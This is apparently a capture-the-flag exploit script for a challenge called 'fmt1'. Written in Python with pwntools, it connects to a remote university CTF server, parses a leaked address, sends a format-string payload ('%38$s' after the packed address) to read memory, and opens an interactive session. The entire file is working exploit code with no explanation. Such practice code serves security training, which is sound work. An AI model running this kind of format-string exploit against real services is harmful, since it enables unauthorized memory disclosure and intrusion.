#!/usr/bin/env python

from pwn import *

# r = process('./fmt1')
r = remote('bamboofox.cs.nctu.edu.tw', 10104)

r.recvuntil('is ')
addr = int(r.recvuntil('.')[:-1], 16)
log.info(hex(addr))

# raw_input('$')

r.sendline(p32(addr) + '%38$s')

r.interactive()
